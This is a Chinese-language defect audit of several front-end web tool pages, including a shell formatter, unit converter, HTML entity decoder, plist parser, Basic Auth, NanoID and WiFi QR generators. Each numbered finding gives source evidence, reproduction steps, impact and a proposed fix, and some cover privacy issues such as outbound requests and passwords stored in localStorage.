- 方案：heredoc 起始行按当前 depth 缩进；正则限定 `<<` 前为空白/重定向位置（如 `/(^|\s)<<-?\s*.../`）并排除引号内与注释行。

### IT-N190 Shell「校验」用全局关键字计数，字符串/注释误计；且结果覆盖格式化输出（低，确认源码缺陷）
- 问题：`doValidate()` 用 `\b(if|for|while|until|case)\b` 与 `\b(fi|done|esac)\b` 统计全文（336-337），不剥离注释/引号，`echo "fi"` 会被当成一个结束块；`{`/`}`/`(`/`)` 也按字符计数（338-341），`${x}`、`$(cmd)` 被计入。最后 `setOut(stats)`（355）把「输出结果」替换成统计文本，格式化结果丢失。
- 证据：`tools/it/shell-script-formatter.html:336-341`、`:342-355`
- 复现：输入 `echo "fi"` → 实际"块未平衡：开始 0 / 结束 1"；输入 `echo "${x}"` → 花括号 1/1 但语义错；点「校验」后已生成的美化结果被统计覆盖。
- 影响：`tools/it/shell-script-formatter.html` —— 校验误报/漏报，且一键"校验"会毁掉已生成结果。
- 方案：校验前剥离 `#` 注释与引号内文本；只统计行首关键字与独占行 `fi/done/esac`；统计写入独立区域，不覆盖 `#output`。

- 留存建议（tools/it/shell-script-formatter.html）：①压缩保留 `&&`/`|`/`else`/`case`/heredoc 换行；②case 分支判定收紧；③`then/do` 与 `}` 本行减级；④heredoc 上下文识别；⑤校验剥离注释/引号且不覆盖输出。

### IT-N191 高级单位换算「温度 ℃」预设传 `from:"℃"`，被校验直接拒绝（中，确认源码缺陷）
- 问题：预设 356 `values:{cat:'temp', val:'100', from:'℃'}`；温度分支只接受 `['C','F','K']`（236），点击后直接输出"⚠️ 温度单位请用 C/F/K。"，100℃ 不会换算。
- 证据：`tools/it/unit-converter-advanced.html:356`、`:235-238`
- 复现：点「温度 ℃」→ 实际提示错误、无结果；期望 `100 → 212.00°F / 373.15K`。
- 影响：`tools/it/unit-converter-advanced.html` —— 4 个预设中 1 个完全不可用，且是唯一带偏移量的类别。
- 方案：预设改 `from:'C'`（或让 `℃/°C/°F/℉` 归一化为 `C/F`），计算前做别名归一。

### IT-N192 文档列「压强与能量」类别，UI 下拉与因子表都没有（中，确认源码缺陷）
- 问题：108 写类别含"压强与能量"；`<select id="cat">`（118）只有 length/mass/temp/area/volume/time/speed/data；`U`（222-230）也无 pressure/energy 因子表，`U[cat]` 永不命中。
- 证据：`tools/it/unit-converter-advanced.html:108`、`:118`、`:222-230`、`:242`
- 复现：下拉里找不到压强/能量；若手工把 select 值改成 `pressure` → 实际"类别 pressure 不支持单位…可选项为空"，期望有 Pa/kPa/bar/psi 等。
- 影响：`tools/it/unit-converter-advanced.html` —— 文档承诺的 10 类里 2 类不存在。
- 方案：删掉该表述，或补 `pressure`（pa/kpa/mpa/bar/psi/atm/mmhg）与 `energy`（j/kj/kcal/wh/kwh/btu）。

### IT-N193 极小值被 `toFixed(6)` + 去零吞成 `0`（1 bit → GB/TB 显示 0）（中，确认源码缺陷）
- 问题：245 `nv.toFixed(6).replace(/\.?0+$/,'')`。|nv|<5e-7 时 `toFixed(6)` 已是 `0.000000`，去零后为 `0`，非零换算值被显示成 0。
- 证据：`tools/it/unit-converter-advanced.html:245`、`:229`
- 复现（node 复算页内公式）：1 bit → GB = `0.125/1073741824 = 1.164e-10` → 实际显示 `0`；→ TB 同样 `0`。期望 `1.164153e-10`（或科学计数）。
- 影响：`tools/it/unit-converter-advanced.html` —— 小单位换大单位结果变成 0，用户会以为无换算关系。
- 方案：数量级 <1e-6 时改用 `toExponential(6)` 或按有效数字格式化，文档同步说明。

### IT-N194 数值框清空/非法输入静默当 0；温度源单位大小写敏感（低，确认源码缺陷）
- 问题：`num('val')` `parseFloat` 后 `isNaN?0`（219），清空数值仍按 0 换算并显示一串 0；温度分支 `['C','F','K'].includes(from)`（236）区分大小写，`c` 被拒。另 128 行 `</div` 缺 `>`。
- 证据：`tools/it/unit-converter-advanced.html:219`、`:232-233`、`:236`、`:128`
- 复现：清空数值 → 实际所有目标单位 `0`，无提示；`from=k`（小写）→ 提示错误（期望大小写不敏感）。
- 影响：`tools/it/unit-converter-advanced.html` —— 空值被当真实 0；小写输入被无谓拒绝；`</div` 未闭合可能影响后续块结构。
- 方案：空值时不计算并提示"请输入数值"；温度单位 `toUpperCase()` 后比较并接受 `°C/℃` 别名；补 `</div>`。

### IT-N195 长度表用 `nm` 表示海里（1852 m），与纳米缩写冲突且无别名（低，确认源码缺陷）
- 问题：223 `length:{…,nm:1852}`。`nm` 在 SI 中是 nanometre（1e-9 m），此处按 nautical mile（1852 m）解释；无 `nmi`/海里别名，也无 `um` 等微米单位。
- 证据：`tools/it/unit-converter-advanced.html:223`、`:242`
- 复现：用户按常识输入 `1 nm` 期望 `1e-9 m`，实际得到 `1.852 km`（差 12 个数量级）；错误提示把可选单位列为 `…,in,nm`。
- 影响：`tools/it/unit-converter-advanced.html` —— 单位语义误导，结果量级错得离谱。
- 方案：改键为 `nmi`（UI 标"海里"），另补 `um:1e-6`。

- 留存建议（tools/it/unit-converter-advanced.html）：①温度预设与单位别名归一；②补或删压强/能量；③小值改科学计数；④空值提示；⑤`nm` 改 `nmi` 并补 `um`。

### IT-N196 HTML 实体解码未校验码点范围，`&#1114112;` 抛未捕获 RangeError（中，确认源码缺陷）
- 问题：`dec()` 的十进制/十六进制分支直接 `String.fromCodePoint(parseInt(...))`（305-306），未校验 0–0x10FFFF；越界码点抛 `RangeError: Invalid code point`，异常从 `onclick` 冒泡，`#output` 不更新、无提示。
- 证据：`tools/it/html-entities-encode.html:298-308`（`:305-306`）
- 复现（node）`String.fromCodePoint(1114112)` → `RangeError: Invalid code point 1114112`；页面输入 `&#1114112;` → 控制台报错、结果区保持旧值；期望原样保留该文本或提示"码点超出 Unicode 范围"。
- 影响：`tools/it/html-entities-encode.html` —— 解码按钮对畸形输入静默失效，用户以为复制/粘贴丢了内容。
- 方案：`cp<=0x10FFFF ? String.fromCodePoint(cp) : m`，或整段 try/catch 后提示；同时过滤 surrogate 区（0xD800–0xDFFF）。

### IT-N197 HTML 实体解码用 `div.innerHTML` 注入用户输入，会触发第三方资源请求（中，确认源码缺陷）
- 问题：`div.innerHTML = text`（302）对任意输入（即使不含实体）都先建完整 DOM；粘贴 `<img src="https://x/y.png">`、`<link>`、`<iframe>` 时浏览器会请求该 URL。元素虽未挂载，`img` 仍会加载；`<script>` 不执行，故非 XSS，而是**出站请求/隐私**问题，与页面及 meta 宣称的"数据不上传、纯前端"（`:10`）冲突。
- 证据：`tools/it/html-entities-encode.html:301-303`、`:177`（`<textarea id="input">`）、`:10`（meta description）
- 复现：输入 `<img src="https://example.com/track.png">` 点「解码」→ DevTools Network 出现对 `example.com` 的请求；期望零请求（纯本地解码）。
- 影响：`tools/it/html-entities-encode.html` —— 用户粘贴含图/链接的 HTML 片段时会向第三方泄露（至少泄露 IP 与 UA），违背隐私承诺，离线场景还会卡顿。
- 方案：改用惰性解析 `new DOMParser().parseFromString(text,'text/html')`（不加载资源），或先去标签再 `innerHTML`，或纯实体表替换（不建 DOM）。

### IT-N198 HTML 实体解码两条路径不一致：含分号实体存在时，无分号 legacy 实体不被解码（低，确认源码缺陷）
- 问题：304 只要文本含任一**带分号**实体，就整段走手写替换（305-307）；三条正则都要求结尾 `;`。同一段里的 `&#65`、`&amp`（HTML 允许省略分号的 legacy 写法）因此不被解码，而 `div.textContent` 原本能解。结果取决于输入里是否还有别的带分号实体。
- 证据：`tools/it/html-entities-encode.html:304-307`
- 复现：输入 `&#65; &amp` → 实际 `A &amp`（`&amp` 未解）；输入仅 `&amp` → 走 textContent 分支 → `&`。同一实体因上下文不同结果不同。
- 影响：`tools/it/html-entities-encode.html` —— 批量清洗混合写法时结果不可预测。
- 方案：统一出口（手写替换后再用 `DOMParser` 文本节点兜底），或补 `&#\d+` / `&#x[0-9a-f]+` 无分号正则并说明取舍。

- 留存建议（tools/it/html-entities-encode.html）：①解码前校验码点范围并捕获异常；②改用 `DOMParser`/本地实体表，避免 `innerHTML` 触发出站请求；③统一有/无分号解码路径；④（可选）补齐常用命名实体并删"完整"表述。

### 承诺 vs 实际（Q 批专项）
- `tools/it/ksuid-generator.html:479`：英文简介"20-byte random payload"，实现 16 字节（281-282）；同段"27-character"但 hex 选项输出 40 字符（170、267-269）。
- `tools/it/calc-3.html:123`、`:187`：承诺 `#RGB` 简写与 8 位 alpha，`hexToRgb` 只收 6 位（238），`maxlength=7`（136）连 8 位都输不进。
- `tools/it/matrix-transpose.html:175`：按钮"导出明细 CSV"实际导历史表（413-415），无 Aᵀ 结果。
- `tools/it/http-cookies.html:169`：英文承诺 parse/build Set-Cookie 头，页面无解析器（仅 171 搜索 + 静态 `COMMANDS`）。
- `tools/it/text-to-ascii.html:102`：承诺十六进制"两位"，实际 1 位（221）；`:119` 按钮"导出明细 CSV"实为历史表（327）。
- `tools/it/shell-script-formatter.html:214`：FAQ"仅调整空白、不改行为"，但「压缩」插入 `;` 并对 `&&`/`|`/case/heredoc 产出非法脚本（323-325）。
- `tools/it/unit-converter-advanced.html:108`：承诺"压强与能量"两类，下拉与因子表均无（118、222-230）。
- `tools/it/html-entities-encode.html:141`、`:10`：标题/meta"完整编解码"，`NAMED` 仅 39 条（257-269），`&alpha;`/`&hearts;` 解码原样返回（307）。
- 备注：`html-entities-encode` 的「导出明细 CSV」（431）与数据表恒空，属 `textarea` + `*ResText()` 读 `textContent` 的 IT-N140 模板缺陷，本批不重复编号；同页 `:317` 复制依赖全局 `event`，与 IT-N31 同模式，不重复计数；`calc-3.html:139-140`、`ksuid-generator` 等页面加载即写一条历史，属历史模板行为，未单列。

### 覆盖
- 实读 8 页：`tools/it/ksuid-generator.html`、`tools/it/calc-3.html`、`tools/it/matrix-transpose.html`、`tools/it/http-cookies.html`、`tools/it/text-to-ascii.html`、`tools/it/shell-script-formatter.html`、`tools/it/unit-converter-advanced.html`、`tools/it/html-entities-encode.html`。
- 新增 32 条（高 2 / 中 18 / 低 12），编号 IT-N167~IT-N198。
- 未覆盖说明：只审计主流程、边界与文档口径，未逐条核对 FAQ/JSON-LD 文案，未检查同模板其它 IT 页；`html-entities-encode` 的"完整实体覆盖"仅按 `NAMED` 表条目数与解码行为核对，未穷举 2000+ HTML5 命名实体。
- 未做验证：未开浏览器（结论均为源码静态分析 + `node -e` 内存复算，Shell 压缩另用 `bash -n` 校验）、未验证英文态 `?lang=en-US`/繁体/移动端、未跑 `_test_static.py`/`_audit_links.py`/`_audit_assets.py`/`run_gates.py` 等门禁，未触发 `_build.py` 或任何 git 写操作。

### IT-N199 JSON→TOML 键名不加引号，含点/空格/空键时输出非法或语义改变（高，确认缺陷）
- 问题：所有键都按裸键直接拼接。TOML 裸键只允许 `A-Za-z0-9_-`；含 `.` 会被解析成嵌套表，含空格/引号/空串直接语法错误。
- 证据：`tools/it/json-to-toml.html:286`（`s += k + ' = '`）、`:288-292`（表头 `prefix + '.' + k`）、`:178`（无"键名加引号"选项）。
- 复现：输入 `{"a.b":1}` → 实际 `a.b = 1`（TOML 读成表 `a.b`），期望 `"a.b" = 1`；`{"a b":1}` → `a b = 1`（解析报错）；`{"":1}` → ` = 1`。node 复算上述三种输入均未做键引用。
- 影响：`tools/it/json-to-toml.html`
- 方案：按 bare-key 正则判断，不匹配则 `JSON.stringify(k)`；表头 `[[full]]` 同样逐段引用，空键改为报错。
**留存建议（tools/it/json-to-toml.html）**：保留工具（JSON→TOML 是刚需），修键名引用并补 `{a.b / a b / ""}` 回归用例。

### IT-N200 "缩进"下拉与 Tab 预设完全无效（中，确认缺陷）
- 问题：块内 `getIndent` 声明两次（后者读下拉）但全文件从未调用；`toToml` 不接收缩进参数，输出固定无缩进，预设"Tab 缩进"也只写 `indent` 字段。
- 证据：`tools/it/json-to-toml.html:177-181`（下拉）、`:317`、`:322`（两个 `getIndent`）、`:276-295`（`toToml(v, prefix)` 无缩进参与）、`:439`（预设仅改 `indent`）。
- 复现：分别选"2 空格 / 4 空格 / Tab"生成同一 JSON，输出逐字节相同（`node` 按源码函数复算，深度参数未被使用）。
- 影响：`tools/it/json-to-toml.html`
- 方案：把 indent 串传入 `toToml` 递归用于 `[table]`/`[[table]]` 前导空格，或删掉该控件与预设避免假开关。
**留存建议（tools/it/json-to-toml.html）**：该控件属于承诺能力，建议实现而非隐藏。

### IT-N201 null、ISO 日期与混合数组的转换与声明不符（中，确认缺陷）
- 问题：`null` 被写成 `""`（静默改类型）；ISO 日期字符串始终走 `JSON.stringify`，输出带引号字符串，与标题"支持 ISO 日期字符串"不符；对象+标量混合数组落入 `JSON.stringify`，产出 `[{"x":1},2]` 这类非 TOML 内联表。
- 证据：`tools/it/json-to-toml.html:268`（null→`""`）、`:271`（字符串恒加引号）、`:283`（仅"全为对象"才按表数组）、`:273`（对象直出 JSON）。
- 复现：node 复算 `{"n":null}`→`n = ""`；`{"d":"2020-01-01T00:00:00Z"}`→`d = "2020-01-01T00:00:00Z"`；`{"a":[{"x":1},2]}`→`a = [{"x":1}, 2]`（TOML 解析器报错）。
- 影响：`tools/it/json-to-toml.html`
- 方案：null 跳过或转注释；日期用正则输出裸 TOML 日期/时间；混合数组转 `{x = 1}` 内联表或直接报错提示。
**留存建议（tools/it/json-to-toml.html）**：至少修三类硬错误（null、混合数组、日期），并在页脚标注"非 100% TOML 规范"。

### IT-N202 plist `real` 整数值降级为 integer，date/data 往返变 string（中，确认缺陷）
- 问题：`parseFloat` 后靠 `Number.isInteger` 决定回写标签，`<real>1.0</real>` 往返成 `<integer>1</integer>`；`<date>`/`<data>` 解析时只取文本，回写统一 `<string>`，与 meta 宣称支持这四种类型不符。
- 证据：`tools/it/plist-parser.html:270`（real）、`:282`（整数/浮点判定）、`:273-274`（date/data 返回 textContent）、`:283`（字符串回写）、`:10`/`:164`（宣称 date/data）。
- 复现：node 复算 `real 1.0` → `<integer>1</integer>`；`<date>2020-01-01T00:00:00Z</date>` → `<string>...`；`<data>AAECAw==</data>` → `<string>AAECAw==</string>`。
- 影响：`tools/it/plist-parser.html`
- 方案：解析时保留类型包装（如 `{__plistType:'real'|'date'|'data'}`），回写按标记输出；real 不再用 `Number.isInteger` 猜。
**留存建议（tools/it/plist-parser.html）**：保留，补 real/date/data 的往返用例。

### IT-N203 plist 大整数超过 2^53 精度丢失（中，确认缺陷）
- 问题：`<integer>` 用 `parseInt` 转 Number，超过 `Number.MAX_SAFE_INTEGER` 的值被就近改写，且无提示。
- 证据：`tools/it/plist-parser.html:269`。
- 复现：node 复算 `parseInt("9007199254740993")` → `9007199254740992`；期望保留原值或明确告警。
- 影响：`tools/it/plist-parser.html`
- 方案：用 `/^-?\d+$/` 校验后 `BigInt` 保存，超安全整数时以字符串标注；或解析时收集告警并在结果区提示。
**留存建议（tools/it/plist-parser.html）**：修复成本低，建议保留并加边界用例。

### IT-N204 plist 字符串控制字符未转义，可产出非法 XML（低，确认缺陷）
- 问题：`escapeXml` 只替换 `& < >`，JSON 字符串中的 U+0000–U+001F（除 `\t\n\r`）直接写入 XML 1.0，属非法字符，可被本页解析器和其他 plist 工具拒收。
- 证据：`tools/it/plist-parser.html:292`、`:283`。
- 复现：node 复算 `toPlistNode("a\u0001b",0)` 输出含裸 U+0001；把该串喂回本页 `parseInput` 会命中 `parsererror`（`:297`）。
- 影响：`tools/it/plist-parser.html`
- 方案：按 XML 1.0 合法码点过滤/替换非法控制字符，并在结果区提示"已剔除 N 个不可打印字符"。
**留存建议（tools/it/plist-parser.html）**：随 N202/N203 一并修，避免生成"自己都解析不了"的 plist。

### IT-N205 "ASCII 码"行用 UTF-8 字节数判定多字节，纯 ASCII 也被误标（中，确认缺陷）
- 问题：条件 `bytes.length <= 1` 才显示单值，否则前缀"多字节序列"；因此 `Hello`、`admin` 这类纯 ASCII 文本也会被标注为多字节序列，且该行内容与下一行 UTF-8 字节完全重复。
- 证据：`tools/it/char-encoder.html:281`。
- 复现：node 复算 `"Hello"` → `多字节序列: 72, 101, 108, 108, 111`；`"A"` → `65`；期望 ASCII 行按码点输出 `72 101 ...` 或对非 ASCII 标 U+XXXX。
- 影响：`tools/it/char-encoder.html`
- 方案：按码点（`codePointAt(0) <= 127`）判定；ASCII 行输出码点，多字节字符显示"非 ASCII（U+XXXX）"，避免与 UTF-8 行重复。
**留存建议（tools/it/char-encoder.html）**：保留，修标签语义。

### IT-N206 清空后字节视图残留上一段文本（低，确认缺陷）
- 问题：`clearAll` 只清 `#input` 与 `#results`，不碰 `#byteViewBox`，字符/字节表继续显示旧文本。
- 证据：`tools/it/char-encoder.html:381-384`、`:168`（独立 `byteViewBox`）、`:335-337`。
- 复现：输入 `Hello` → 点"清空" → 输入框空、结果空，但字节表仍是 H/e/l/l/o 行（期望整表消失）。
- 影响：`tools/it/char-encoder.html`
- 方案：`clearAll` 内补 `byteViewBox.innerHTML=''`，或直接调用 `convert()` 走空输入分支（`:275` 已实现清空）。
**留存建议（tools/it/char-encoder.html）**：一行修复，建议保留。

### IT-N207 "HTML 命名"只覆盖 9 个字符，与格式名不符（低，确认缺陷）
- 问题：命名实体映射仅 `& < > " ' © ® ™ €` 9 项，其余字符原样输出，且没有 `&nbsp;`；标签叫"HTML 命名"容易让用户以为全量命名实体。
- 证据：`tools/it/char-encoder.html:286-290`、`:174`（格式清单）。
- 复现：输入 `中`/`é` → 该行原样返回 `中`/`é`；期望无命名实体时显示"—"或改用十进制。
- 影响：`tools/it/char-encoder.html`
- 方案：改名"常用 HTML 实体"或补全 HTML5 命名实体表（与 `html-entities-encode.html` 共享数据）。
**留存建议（tools/it/char-encoder.html）**：文案层修复即可。

### IT-N208 用户名含冒号不校验，令牌被服务端按首个冒号切分（中，确认缺陷）
- 问题：RFC 7617 规定 user-id 不得含 `:`，页面直接 `user+':'+pass` 编码，`a:b` + `c` 得到 `a:b:c`，服务端会解成 user=`a`、password=`b:c`，认证错位且用户无感知。
- 证据：`tools/it/basic-auth-generator.html:282`、`:277-281`（无任何输入校验）。
- 复现：node 复算 `btoa("a:b:c")` = `YTpiOmM=`；按 RFC 解码即 user=`a`、pass=`b:c`，与输入不符。
- 影响：`tools/it/basic-auth-generator.html`
- 方案：用户名含 `:` 时阻止生成并提示"用户名不能包含冒号（RFC 7617）"。
**留存建议（tools/it/basic-auth-generator.html）**：保留，补输入校验。

### IT-N209 非 ASCII 凭据按 UTF-8 编码但无 charset 声明，与自身引据矛盾（中，确认缺陷）
- 问题：构造说明写"按 UTF-8 编码"（`btoa(unescape(encodeURIComponent))`），引据表却写"默认 ISO 8859-1，可用 charset 声明 UTF-8"，而页面既不声明 charset 也不提示服务端需支持 UTF-8，服务端按 ISO-8859-1 解码即乱码。
- 证据：`tools/it/basic-auth-generator.html:275`、`:118`、`:210-211`；meta `:8` 还宣称"支持中文用户名"。
- 复现：node 复算 `btoa(unescape(encodeURIComponent("admin:密码")))` 得到 UTF-8 字节令牌；按 ISO-8859-1 解码为 `admin:å¯†ç `（乱码），期望页面提示或提供 ASCII/UTF-8 选项。
- 影响：`tools/it/basic-auth-generator.html`
- 方案：输出区标注"含非 ASCII 时服务端须按 UTF-8 解码（RFC 7617 charset）"，或对非 ASCII 输入给出显式警告。
**留存建议（tools/it/basic-auth-generator.html）**：补一句能力边界说明即可。

### IT-N210 历史快照把密码明文写入 localStorage（中，确认缺陷/隐私）
- 问题：快照遍历页面所有 `input[id]`，`f_pass`（`type=password`）同样被收集，随后写入 TBKit 历史（localStorage），密码长期落盘，同源脚本可读。
- 证据：`tools/it/basic-auth-generator.html:292-299`（收集所有 input，仅排除 button/submit/hidden）、`:127`（`f_pass`）、`:375-378`（`history.record`）。
- 复现：输入 `admin/secret` → 生成 → localStorage 历史 JSON 出现 `"f_pass":"secret"`（静态路径可证，未开浏览器验证键名）。
- 影响：`tools/it/basic-auth-generator.html`
- 方案：快照跳过 `type=password` 或显式排除 `f_pass`；历史只保留 token/请求头，不存原始密码。
**留存建议（tools/it/basic-auth-generator.html）**：安全项，建议优先修。

### IT-N211 复制提示 `i18nText()` 无参，toast 显示 undefined（低，确认缺陷）
- 问题：`copyField` 两处调用 `i18nText()` 不传 key，`i18nText(undefined)` 最终回落 `undefined`，`showToast` 把 `textContent` 设为字符串 "undefined"。
- 证据：`tools/it/basic-auth-generator.html:276`；`js/common.js:1510-1521`（缺 key 时回落 `key` 本身）。
- 复现：点"复制请求头" → 剪贴板内容正确，但提示条出现 `undefined`（源码路径推导，未开浏览器）。
- 影响：`tools/it/basic-auth-generator.html`
- 方案：改为 `i18nText('toast.copied','已复制')` 一类带 key 的调用。
**留存建议（tools/it/basic-auth-generator.html）**：文案层修复。

### IT-N212 自定义字母表超过 256 字符时后半段字符永远不可达（中，确认缺陷）
- 问题：`idx = bytes[i] & mask`，单字节最大 255；字母表长度 257–511 时 mask=511，但索引永远 ≤255，256 及之后的字符被静默排除；`customAlpha` 也无长度上限。
- 证据：`tools/it/nanoid-generator.html:295-296`（mask/step）、`:302-304`（按位与取值）、`:176`（自定义输入无 maxlength）。
- 复现：node 用 300 个不同字符作字母表、100 次采样，`usedMax` 仅 243，索引 >255 从未出现；期望 300 个字符均可能被选中，或 UI 明确限制 256。
- 影响：`tools/it/nanoid-generator.html`
- 方案：字母表 >256 时改用 32 位随机数拒绝采样，或在输入处限制 256 并提示。
**留存建议（tools/it/nanoid-generator.html）**：保留，修上限/采样。

### IT-N213 自定义字母表按 UTF-16 码元处理，emoji 会被拆成孤立代理项（中，确认缺陷）
- 问题：长度、去重与取值都基于 UTF-16 码元，`Array.from` 缺失；一个 emoji 即占 2 个"字符"，`alphabet[idx]` 取到的是半个代理对，生成的 ID 含非法孤立代理项。
- 证据：`tools/it/nanoid-generator.html:285-289`（`a.length`/`new Set(a)`）、`:304`（`alphabet[idx]`）。
- 复现：node 模拟：字母表 `"😀😁"` 的 `length=4`、通过"至少 2 字符"校验；按码元索引可产出 `\uD83D` 或 `\uDE00` 单独半字（复制/粘贴后显示为 �）。
- 影响：`tools/it/nanoid-generator.html`
- 方案：统一 `const chars=Array.from(a)`，用 `chars.length`/`new Set(chars)`/`chars[idx]`。
**留存建议（tools/it/nanoid-generator.html）**：与 N212 同批修。

### IT-N214 历史与图表读取首个 `.result-box`（静态说明块），结果恒为同一段文字（中，确认缺陷）
- 问题：`*ResText()` 用 `document.querySelector('.result-box')`，页面首个该类元素是"📖 NanoID 说明"静态容器，而真正的 `#results` 没有该 class；历史每条记录都写同一段说明前 80 字，图表/趋势恒定。
- 证据：`tools/it/nanoid-generator.html:372`（选择器）、`:190`（说明块 `.result-box`）、`:178`（`#results`）、`:447`（record）。
- 复现：连续生成 8 位与 24 位 ID → 历史两条 `res` 均为"• 默认长度 21 字符…"，期望记录实际生成的 ID 列表。
- 影响：`tools/it/nanoid-generator.html`
- 方案：改为读取 `#results` 内 `textarea/code` 的 `value`，或给结果区加唯一 id 并显式取用它。
**留存建议（tools/it/nanoid-generator.html）**：保留，修历史取值。

### IT-N215 Markdown 单元格不处理既有反斜杠，`a\|b` 会破坏列结构（中，确认缺陷）
- 问题：`escapeMarkdown` 仅把 `|` 换成 `\|`、换行换空格；输入本身含 `\` 时转义串变成 `\\|`，GFM 把 `\\` 当字面反斜杠、`|` 重新成为列分隔符，单元格被拆开。
- 证据：`tools/it/markdown-table-generator.html:257-262`、`:129`（公式只说明"把 `|` 转成 `\|`"）。
- 复现：node 复算 `"a\\|b"`（源文本 `a\|b`）→ `"a\\\\|b"`（源文本 `a\\|b`），渲染列数由 1 变 2；期望先把 `\` 转义为 `\\` 再处理 `|`。
- 影响：`tools/it/markdown-table-generator.html`
- 方案：`replace(/\\/g,'\\\\')` 先于 `replace(/\|/g,'\\|')`，并补用例。
**留存建议（tools/it/markdown-table-generator.html）**：保留，修转义顺序。

### IT-N216 表头/首行实时回写并自动补占位，光标跳末尾、无法删列（中，确认缺陷）
- 问题：两个输入都绑 `oninput="syncColumns()"`，函数把补齐后的值写回 `input.value`；用户键入 `a` 时 cols=3，值立即变 `a,列,列`，光标跳末尾，删掉尾列会被立刻补回。
- 证据：`tools/it/markdown-table-generator.html:148`、`:151`（oninput）、`:309-321`（syncColumns 回写）、`:246`（`C${i+1}` 占位）。
- 复现：node 模拟 `syncColumns(parseRow("a"),3)` → `a,列,列`；期望编辑期不改写输入，生成时再补齐/截断。
- 影响：`tools/it/markdown-table-generator.html`
- 方案：去掉 `oninput` 回写，改为失焦或"生成"时补齐；或仅在内部状态补，不写回输入框。
**留存建议（tools/it/markdown-table-generator.html）**：保留，交互修复。

### IT-N217 行列输入不支持逗号转义，内容含逗号即被拆列（低，确认缺陷）
- 问题：`parseRow` 直接 `split(',')`，没有引号/转义规则；单元格内容含英文逗号时无法表达，会被拆成额外列。
- 证据：`tools/it/markdown-table-generator.html:236-241`、`:147`（说明只写"英文逗号分隔"）。
- 复现：node 复算想输入 `a,b` 与 `c`：写 `"a\\,b,c"` → `["a\\","b","c"]` 3 列，期望 2 列 `["a,b","c"]`。
- 影响：`tools/it/markdown-table-generator.html`
- 方案：支持 CSV 双引号包裹（`"a,b",c`），或提供逐格编辑表格。
**留存建议（tools/it/markdown-table-generator.html）**：文档标注限制或加引号解析。

### IT-N218 WiFi 字符串未按 ZXing 规则转义，含 `;`/`\` 时字段截断（高，确认缺陷）
- 问题：SSID/密码直接拼接，未对 `\ ; , : "` 转义；含分号时后续字段被解析为独立字段，末尾反斜杠还会吞掉结束符；页面注释却明确写"无需手动转义"，与引据表"特殊字符需转义"自相矛盾。
- 证据：`tools/it/wifi-qr-generator.html:235-236`（拼接）、`:175`（"无需手动转义"）、`:110`（引据表要求转义）。
- 复现：node 复算 SSID=`My;AP`、密码=`pw;x` → `WIFI:T:WPA;S:My;AP;P:pw;x;;`，扫码端解析为 S=`My`、P=`pw`（数据缺失）；期望 `S:My\;AP;P:pw\;x;;`。
- 影响：`tools/it/wifi-qr-generator.html`
- 方案：统一转义函数（`\` 先转 `\\`，再对 `; , : "` 前加 `\`），同步修正 `:175` 文案。
**留存建议（tools/it/wifi-qr-generator.html）**：高优修复后再考虑上线推广。

### IT-N219 隐藏网络字段顺序/分号错误：多一个空字段且缺结尾 `;;`（中，确认缺陷）
- 问题：`;H:true` 被追加在已带分号的 `P` 字段后，产生空字段；结尾只补一个 `;`，不符合规范要求的 `;;` 结束。
- 证据：`tools/it/wifi-qr-generator.html:235-236`。
- 复现：node 复算 hidden=true → `WIFI:T:WPA;S:MyHomeAP;P:secret123;;H:true;`；期望 `WIFI:T:WPA;S:MyHomeAP;P:secret123;H:true;;`；nopass 隐藏同样得到 `...S:x;;H:true;`。
- 影响：`tools/it/wifi-qr-generator.html`
- 方案：按字段数组拼接（`T,S,P,H` 后统一 join(';')），末尾固定 `;;`，H 置于 P 之后、结束符之前。
**留存建议（tools/it/wifi-qr-generator.html）**：与 N218 同批修。

### IT-N220 名为"二维码生成器"却不生成二维码（中，确认缺陷/承诺不符）
- 问题：标题、H1、面包屑均为"WiFi 配网二维码生成器"，简介/公式说明写"生成 WiFi 配网二维码""任何扫码 App 都能识别"，但页面无 QR 库、canvas 或图像输出，只产出 `WIFI:` 文本并要求"复制后交给二维码工具"。
- 证据：`tools/it/wifi-qr-generator.html:10`、`:83`、`:103`、`:105`、`:236`（仅字符串输出）。
- 复现：点击"生成" → 页面只有文本域与复制按钮，无可扫描图像；期望至少输出可保存的二维码图片。
- 影响：`tools/it/wifi-qr-generator.html`
- 方案：内置纯前端 QR 渲染（无后端），或把页面改名为"WiFi 配网字符串生成器"并在首句说明需外部二维码工具。
**留存建议（tools/it/wifi-qr-generator.html）**：若不做 QR，务必改名以免误导。

### IT-N221 两处 `</div` 缺少 `>`，存在结构/残留文本风险（低，确认缺陷）
- 问题：HTML 中出现两个未闭合的结束标签片段 `</div`（无 `>`），解析器的错误恢复可能把残留字符当文本或改变嵌套。
- 证据：`tools/it/wifi-qr-generator.html:128`、`:134`。
- 复现：静态阅读确认；浏览器容错后的实际渲染未实测（未开浏览器），故标"低/待验证"。
- 影响：`tools/it/wifi-qr-generator.html`
- 方案：补全为 `</div>`。
**留存建议（tools/it/wifi-qr-generator.html）**：顺手修，成本 2 个字符。

### IT-N222 "图表"页签默认隐藏结果区，"数据表"页签显示的却是结果卡片（中，确认缺陷）
- 问题：初始化调用 `__pssShow('chart')`，把整个 `#result`（PPI、尺寸、分辨率及机型表）设为 `display:none`；只有点"数据表"才显示结果，而真正的 TBKit 数据表（`#phone_screen_sizesTable`）没有页签入口，标签语义与内容错位。
- 证据：`tools/it/phone-screen-sizes.html:367-372`（`__pssShow`）、`:379`（默认 chart）、`:145`（`#result`）、`:152-155`（页签）。
- 复现：打开页面 → 计算结果不可见，只见 PPI 曲线；点"数据表" → 出现结果卡片而非表格；期望默认展示结果或页签改名为"结果/图表"。
- 影响：`tools/it/phone-screen-sizes.html`
- 方案：默认 `display:''` 且保留图表切换；页签改为"结果+图表 / 历史"，或把机型表放进"数据表"面板。
**留存建议（tools/it/phone-screen-sizes.html）**：保留，调整默认态与标签。

### IT-N223 宣称可查 DPR，参数表却无 DPR/CSS 视口，且分辨率书写顺序前后不一（中，确认缺陷）
- 问题：体验清单和 FAQ 反复讲 DPR（"查主流机型分辨率与 DPR 做适配"），但 10 款机型表只有尺寸/分辨率/PPI 四列，无 DPR、无 CSS 视口，也无 DPR 计算；同一台 iPhone 15 Pro 在表格写 `2556×1179`、示例写 `1179×2556`，顺序不统一。
- 证据：`tools/it/phone-screen-sizes.html:178-179`（宣称）、`:272-282`（表）、`:291-294`（表头）、`:181`（示例顺序）、`:184-185`（FAQ 讲 DPR）。
